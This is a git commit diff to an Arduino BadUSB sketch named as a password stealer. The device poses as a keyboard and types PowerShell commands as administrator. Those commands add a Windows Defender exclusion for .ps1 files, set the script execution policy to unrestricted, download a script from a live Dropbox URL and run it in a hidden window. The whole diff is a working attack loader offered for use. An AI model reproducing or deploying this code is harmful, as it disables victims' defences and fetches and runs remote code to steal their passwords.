3f86e91255c76c12f339e0b215dfc48b3ef7129a
elliotYouKnow <71063979+tuconnaisyouknow@users.noreply.github.com>
2022-03-08 19:22:49 +0100

    Update BadUSB_passStealer.ino

--- BadUSB_passStealer.ino
+++ BadUSB_passStealer.ino
@@ -9,19 +9,21 @@ void typeKey(int key){
 
 void setup()
 {
-  // Start Keyboard and Mouse
+  // Start Keyboard
   
   Keyboard.begin();
-
+  
   delay(2500);
 
+  // Windows + D = minimize all apps
+  
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('d');
   Keyboard.releaseAll();
 
   delay(500);
 
-  // Disable Windows Password
+  // Start powershell ad Admin
 
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
@@ -48,6 +50,8 @@ void setup()
   typeKey(KEY_RETURN);
 
   delay(2000);
+  
+  // Go to C:\Users\Public\Documents directory
 
   Keyboard.print("cd C:");
 
@@ -73,50 +77,30 @@ void setup()
   Keyboard.print("Documents");
 
   typeKey(KEY_RETURN);  
+  
+  // Add exception in antivirus for ps1 extension
 
   Keyboard.print("Add-MpPreference -ExclusionExtension ps1 -Force");
 
   typeKey(KEY_RETURN);
+  
+  // Allows all script to be executed on pc
 
   Keyboard.print("Set-ExecutionPolicy unrestricted -Force");
 
   typeKey(KEY_RETURN);
+  
+  // Download main script
 
-  Keyboard.print("wget LINK -OutFile ciaoV2.ps1");
+  Keyboard.print("wget https://www.dropbox.com/s/f4omlmphgin74ie/ciaoV2.ps1?raw=1 -OutFile ciaoV2.ps1");
 
   typeKey(KEY_RETURN);
 
   delay(3500);
   
-  Keyboard.print("powershell.exe -noexit -windowstyle hidden -file C:");
-
-  Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press(KEY_LEFT_ALT);
-  Keyboard.press(173);
-  Keyboard.releaseAll();
-
-  Keyboard.print("Users");
-
-  Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press(KEY_LEFT_ALT);
-  Keyboard.press(173);
-  Keyboard.releaseAll();
+  // Start main script
   
-  Keyboard.print("Public");
-  
-  Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press(KEY_LEFT_ALT);
-  Keyboard.press(173);
-  Keyboard.releaseAll();
-  
-  Keyboard.print("Documents");
-
-  Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press(KEY_LEFT_ALT);
-  Keyboard.press(173);
-  Keyboard.releaseAll();
-
-  Keyboard.print("ciaoV2.ps1");
+  Keyboard.print("powershell.exe -noexit -windowstyle hidden -file ciaoV2.ps1");
 
   typeKey(KEY_RETURN);
 
